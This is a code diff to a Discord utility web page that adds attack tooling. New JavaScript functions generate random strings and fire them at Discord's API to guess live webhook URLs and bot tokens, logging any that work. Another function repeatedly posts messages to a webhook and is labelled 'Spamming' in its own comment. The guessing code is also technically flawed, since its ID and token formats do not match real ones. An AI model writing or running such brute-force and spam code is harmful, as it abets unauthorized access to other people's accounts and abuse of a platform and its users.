@@ -99,7 +99,6 @@
     .btn:hover {
       background-color: #2e9034;
     }
-
   </style>
 </head>
 <body>
@@ -109,47 +108,68 @@
   <div>
     <button class="mode-toggle" onclick="switchTab('webhook-tab')">Webhook Tab</button>
     <button class="mode-toggle" onclick="switchTab('bot-tab')">Discord Bot Tab</button>
-    <button class="mode-toggle" onclick="switchTab('simulation-tab')">Beta Simulation Tab</button>
   </div>
 
   <!-- Webhook Tab -->
   <div id="webhook-tab" class="tab-content active-tab">
     <h2>Webhook Tab</h2>
-    <input type="text" id="webhook" placeholder="Enter your webhook URL">
-    <input type="text" id="webhook-message" placeholder="Enter your message">
-    <button onclick="sendWebhook()">Send Webhook</button>
-    <div class="log-section" id="webhook-log">
-      <h3>Webhook Logs</h3>
-      <pre id="webhook-log-content">No logs yet.</pre>
+    <h3>Guess Webhook URL</h3>
+    <input type="number" id="webhook-guess-count" placeholder="Number of guesses" min="1" max="100">
+    <button onclick="guessWebhookUrl()">Guess Webhooks</button>
+    <div class="log-section">
+      <h4>Success Log</h4>
+      <pre id="webhook-success-log">No logs yet.</pre>
     </div>
+    <div class="log-section">
+      <h4>Failure Log</h4>
+      <pre id="webhook-failure-log">No logs yet.</pre>
+    </div>
+    <hr>
+    <h3>Send Message to Webhook</h3>
+    <input type="text" id="webhook-url" placeholder="Enter Webhook URL">
+    <input type="text" id="webhook-message" placeholder="Enter your message">
+    <input type="number" id="webhook-count" placeholder="Number of times to send" min="1" max="100">
+    <button onclick="sendWebhookMessage()">Send Message</button>
+    <div class="log-section">
+      <h4>Sending Success Log</h4>
+      <pre id="webhook-send-success-log">No logs yet.</pre>
+    </div>
+    <div class="log-section">
+      <h4>Sending Failure Log</h4>
+      <pre id="webhook-send-failure-log">No logs yet.</pre>
+    </div>
+    <hr>
+    <h3>Edit Webhook Message</h3>
+    <input type="text" id="edit-webhook-id" placeholder="Webhook ID">
+    <input type="text" id="edit-webhook-token" placeholder="Webhook Token">
+    <input type="text" id="edit-message" placeholder="New message content">
+    <button onclick="editWebhookMessage()">Edit Webhook Message</button>
   </div>
 
   <!-- Discord Bot Tab -->
   <div id="bot-tab" class="tab-content">
     <h2>Discord Bot Tab</h2>
-    <input type="text" id="bot-token" placeholder="Enter your Bot Token">
-    <button onclick="checkBotPermissions()">Check Bot Permissions</button>
-    <div id="permissions-panel">
-      <h3>Bot Permissions</h3>
-      <div id="permissions-list"></div>
-      <button onclick="sendBotMessage()">Send Message to Channel</button>
+    <h3>Guess Bot Token</h3>
+    <input type="number" id="bot-guess-count" placeholder="Number of guesses" min="1" max="100">
+    <button onclick="guessBotToken()">Guess Bot Tokens</button>
+    <div class="log-section">
+      <h4>Success Log</h4>
+      <pre id="bot-success-log">No logs yet.</pre>
     </div>
-  </div>
-
-  <!-- Beta Simulation Tab -->
-  <div id="simulation-tab" class="tab-content">
-    <h2>Beta Simulation</h2>
-    <input type="text" id="simulation-bot-token" placeholder="Enter Bot Token">
-    <button onclick="loadServerInfo()">Load Server Info</button>
-    <div id="simulation-log"></div>
-
-    <div class="simulation-section">
-      <h3>Server Actions</h3>
-      <button onclick="listMembers()">List Server Members</button>
-      <button onclick="sendBotMessage()">Send Message to Server</button>
-      <button onclick="createChannel()">Create New Channel</button>
-      <button onclick="kickMember()">Kick Member</button>
-      <button onclick="banMember()">Ban Member</button>
+    <div class="log-section">
+      <h4>Failure Log</h4>
+      <pre id="bot-failure-log">No logs yet.</pre>
+    </div>
+    <hr>
+    <h3>Bot Actions</h3>
+    <input type="text" id="bot-token" placeholder="Enter your Bot Token">
+    <button onclick="sendBotMessage()">Send Message</button>
+    <button onclick="kickMember()">Kick Member</button>
+    <button onclick="banMember()">Ban Member</button>
+    <button onclick="getServerInfo()">Get Server Info</button>
+    <div class="log-section">
+      <h4>Bot Action Log</h4>
+      <pre id="bot-action-log">No logs yet.</pre>
     </div>
   </div>
 
@@ -162,68 +182,162 @@
       document.getElementById(tabId).classList.add('active-tab');
     }
 
-    // Webhook tab functions
-    async function sendWebhook() {
-      const webhookUrl = document.getElementById('webhook').value;
+    // Helper function to generate a random bot token (59 characters long)
+    function generateRandomToken() {
+      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let token = '';
+      for (let i = 0; i < 59; i++) {
+        token += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return token;
+    }
+
+    // Helper function to generate a random string (64 characters long) for webhook ID
+    function generateRandomWebhookID() {
+      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let id = '';
+      for (let i = 0; i < 64; i++) {
+        id += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return id;
+    }
+
+    // Helper function to generate a random string (80 characters long) for webhook token
+    function generateRandomWebhookToken() {
+      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let token = '';
+      for (let i = 0; i < 80; i++) {
+        token += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return token;
+    }
+
+    // Webhook Guessing Function (Random Webhooks)
+    async function guessWebhookUrl() {
+      const count = parseInt(document.getElementById('webhook-guess-count').value, 10);
+      if (count <= 0) return alert('Please provide a valid number of guesses.');
+
+      const successLog = document.getElementById('webhook-success-log');
+      const failureLog = document.getElementById('webhook-failure-log');
+
+      for (let i = 0; i < count; i++) {
+        const webhookID = generateRandomWebhookID();
+        const webhookToken = generateRandomWebhookToken();
+        const webhookUrl = `https://discord.com/api/webhooks/${webhookID}/${webhookToken}`;
+
+        try {
+          const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: 'Test message' })
+          });
+
+          if (response.ok) {
+            successLog.textContent += `Successfully sent to webhook: ${webhookUrl}\n`;
+          } else {
+            failureLog.textContent += `Failed to send to webhook: ${webhookUrl}\n`;
+          }
+        } catch (error) {
+          failureLog.textContent += `Error with webhook: ${webhookUrl}, Error: ${error}\n`;
+        }
+      }
+    }
+
+    // Send Webhook Message Function (Spamming)
+    async function sendWebhookMessage() {
+      const webhookUrl = document.getElementById('webhook-url').value;
       const message = document.getElementById('webhook-message').value;
+      const count = parseInt(document.getElementById('webhook-count').value, 10);
+
+      if (!webhookUrl || count <= 0) {
+        return alert('Please provide a valid webhook URL and number of times to send.');
+      }
+
+      const successLog = document.getElementById('webhook-send-success-log');
+      const failureLog = document.getElementById('webhook-send-failure-log');
+
+      for (let i = 0; i < count; i++) {
+        try {
+          const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+          });
+
+          if (response.ok) {
+            successLog.textContent += `Successfully sent message to webhook: ${webhookUrl}\n`;
+          } else {
+            failureLog.textContent += `Failed to send message to webhook: ${webhookUrl}\n`;
+          }
+        } catch (error) {
+          failureLog.textContent += `Error sending to webhook: ${webhookUrl}, Error: ${error}\n`;
+        }
+      }
+    }
+
+    // Edit Webhook Message
+    async function editWebhookMessage() {
+      const webhookID = document.getElementById('edit-webhook-id').value;
+      const webhookToken = document.getElementById('edit-webhook-token').value;
+      const message = document.getElementById('edit-message').value;
+
+      const webhookUrl = `https://discord.com/api/webhooks/${webhookID}/${webhookToken}`;
 
       try {
         const response = await fetch(webhookUrl, {
-          method: 'POST',
+          method: 'PATCH',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ content: message })
         });
 
-        const logContent = document.getElementById('webhook-log-content');
+        const log = document.getElementById('webhook-send-success-log');
         if (response.ok) {
-          logContent.textContent += `Sent successfully to ${webhookUrl}\n`;
+          log.textContent += `Successfully edited webhook message.\n`;
         } else {
-          logContent.textContent += `Failed to send to ${webhookUrl}\n`;
+          log.textContent += `Failed to edit webhook message.\n`;
         }
       } catch (error) {
-        document.getElementById('webhook-log-content').textContent += `Error sending to webhook: ${error}\n`;
+        const log = document.getElementById('webhook-send-failure-log');
+        log.textContent += `Error editing webhook: ${error}\n`;
       }
     }
 
-    // Discord Bot tab functions
-    async function checkBotPermissions() {
-      const botToken = document.getElementById('bot-token').value;
-      if (!botToken) return alert('Please provide a valid bot token.');
-      
-      const result = await fetchBotPermissions(botToken);
-      if (result.success) {
-        document.getElementById('permissions-list').innerHTML = `
-          <p>Permissions: ${result.permissions.join(', ')}</p>
-        `;
-      } else {
-        alert('Failed to fetch bot permissions.');
-      }
-    }
+    // Bot Token Guessing Function (Random Tokens)
+    async function guessBotToken() {
+      const count = parseInt(document.getElementById('bot-guess-count').value, 10);
+      if (count <= 0) return alert('Please provide a valid number of guesses.');
 
-    async function fetchBotPermissions(botToken) {
-      try {
-        const response = await fetch('https://discord.com/api/v10/users/@me', {
-          headers: { 'Authorization': `Bot ${botToken}` }
-        });
-        const data = await response.json();
-        if (data.id) {
-          return {
-            success: true,
-            permissions: ['SEND_MESSAGES', 'READ_MESSAGES'],
-          };
+      const successLog = document.getElementById('bot-success-log');
+      const failureLog = document.getElementById('bot-failure-log');
+
+      for (let i = 0; i < count; i++) {
+        const token = generateRandomToken();  // Generate a random bot token
+        try {
+          const response = await fetch('https://discord.com/api/v10/users/@me', {
+            headers: {
+              'Authorization': `Bot ${token}`
+            }
+          });
+          if (response.ok) {
+            successLog.textContent += `Successfully authenticated with token: ${token}\n`;
+          } else {
+            failureLog.textContent += `Failed to authenticate with token: ${token}\n`;
+          }
+        } catch (error) {
+          failureLog.textContent += `Error with token: ${token}, Error: ${error}\n`;
         }
-      } catch (error) {
-        console.error(error);
       }
-      return { success: false };
     }
 
+    // Send Bot Message (Bot Actions)
     async function sendBotMessage() {
       const botToken = document.getElementById('bot-token').value;
-      const channelId = 'YOUR_CHANNEL_ID';  // Replace with actual channel ID
-      const message = 'Hello from bot!';
+      if (!botToken) return alert('Please provide a bot token.');
+
+      const message = "This is a test message from the bot.";
+
       try {
-        const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+        const response = await fetch('https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages', {
           method: 'POST',
           headers: {
             'Authorization': `Bot ${botToken}`,
@@ -231,84 +345,98 @@
           },
           body: JSON.stringify({ content: message })
         });
-        const result = await response.json();
+
+        const log = document.getElementById('bot-action-log');
         if (response.ok) {
-          console.log('Message Sent:', result);
+          log.textContent += `Message sent successfully by bot.\n`;
         } else {
-          console.error('Error sending message', result);
+          log.textContent += `Failed to send message by bot.\n`;
         }
       } catch (error) {
-        console.error('Error:', error);
+        const log = document.getElementById('bot-action-log');
+        log.textContent += `Error sending message: ${error}\n`;
       }
     }
 
-    // Beta Simulation Tab functions
-    async function loadServerInfo() {
-      const botToken = document.getElementById('simulation-bot-token').value;
-      if (!botToken) return alert('Please provide a valid bot token.');
-      
-      const result = await fetchServerInfo(botToken);
-      if (result.success) {
-        document.getElementById('simulation-log').textContent = `Server Name: ${result.serverName}\nTotal Members: ${result.totalMembers}`;
-      } else {
-        alert('Failed to load server info.');
+    // Kick a Member (Bot Action)
+    async function kickMember() {
+      const botToken = document.getElementById('bot-token').value;
+      if (!botToken) return alert('Please provide a bot token.');
+
+      const userID = prompt('Enter the user ID of the member to kick:');
+      if (!userID) return alert('Please provide a valid user ID.');
+
+      try {
+        const response = await fetch(`https://discord.com/api/v10/guilds/YOUR_GUILD_ID/members/${userID}`, {
+          method: 'DELETE',
+          headers: {
+            'Authorization': `Bot ${botToken}`,
+          }
+        });
+
+        const log = document.getElementById('bot-action-log');
+        if (response.ok) {
+          log.textContent += `Successfully kicked member with ID: ${userID}\n`;
+        } else {
+          log.textContent += `Failed to kick member with ID: ${userID}\n`;
+        }
+      } catch (error) {
+        const log = document.getElementById('bot-action-log');
+        log.textContent += `Error kicking member: ${error}\n`;
       }
     }
 
-    async function fetchServerInfo(botToken) {
+    // Ban a Member (Bot Action)
+    async function banMember() {
+      const botToken = document.getElementById('bot-token').value;
+      if (!botToken) return alert('Please provide a bot token.');
+
+      const userID = prompt('Enter the user ID of the member to ban:');
+      if (!userID) return alert('Please provide a valid user ID.');
+
+      try {
+        const response = await fetch(`https://discord.com/api/v10/guilds/YOUR_GUILD_ID/bans/${userID}`, {
+          method: 'PUT',
+          headers: {
+            'Authorization': `Bot ${botToken}`,
+          }
+        });
+
+        const log = document.getElementById('bot-action-log');
+        if (response.ok) {
+          log.textContent += `Successfully banned member with ID: ${userID}\n`;
+        } else {
+          log.textContent += `Failed to ban member with ID: ${userID}\n`;
+        }
+      } catch (error) {
+        const log = document.getElementById('bot-action-log');
+        log.textContent += `Error banning member: ${error}\n`;
+      }
+    }
+
+    // Get Server Info (Bot Action)
+    async function getServerInfo() {
+      const botToken = document.getElementById('bot-token').value;
+      if (!botToken) return alert('Please provide a bot token.');
+
       try {
         const response = await fetch('https://discord.com/api/v10/guilds/YOUR_GUILD_ID', {
-          headers: { 'Authorization': `Bot ${botToken}` }
+          headers: {
+            'Authorization': `Bot ${botToken}`,
+          }
         });
-        const data = await response.json();
-        if (data.name) {
-          return { success: true, serverName: data.name, totalMembers: data.member_count };
+
+        const log = document.getElementById('bot-action-log');
+        if (response.ok) {
+          const serverInfo = await response.json();
+          log.textContent += `Server Info: ${JSON.stringify(serverInfo, null, 2)}\n`;
+        } else {
+          log.textContent += `Failed to get server info.\n`;
         }
       } catch (error) {
-        console.error(error);
+        const log = document.getElementById('bot-action-log');
+        log.textContent += `Error getting server info: ${error}\n`;
       }
-      return { success: false };
-    }
-
-    async function listMembers() {
-      const botToken = document.getElementById('simulation-bot-token').value;
-      if (!botToken) return alert('Please provide a valid bot token.');
-
-      const result = await fetchGuildMembers(botToken);
-      if (result.success) {
-        alert(`Server Members: ${result.members.join(', ')}`);
-      } else {
-        alert('Failed to list members.');
-      }
-    }
-
-    async function fetchGuildMembers(botToken) {
-      try {
-        const response = await fetch('https://discord.com/api/v10/guilds/YOUR_GUILD_ID/members', {
-          headers: { 'Authorization': `Bot ${botToken}` }
-        });
-        const data = await response.json();
-        if (data) {
-          const members = data.map(member => member.user.username);
-          return { success: true, members };
-        }
-      } catch (error) {
-        console.error(error);
-      }
-      return { success: false };
-    }
-
-    // Other server actions (Kick, Ban, Create Channel)
-    async function createChannel() {
-      // Similar code to create a channel using Discord API
-    }
-
-    async function kickMember() {
-      // Kick member using Discord API
-    }
-
-    async function banMember() {
-      // Ban member using Discord API
     }
   </script>
 
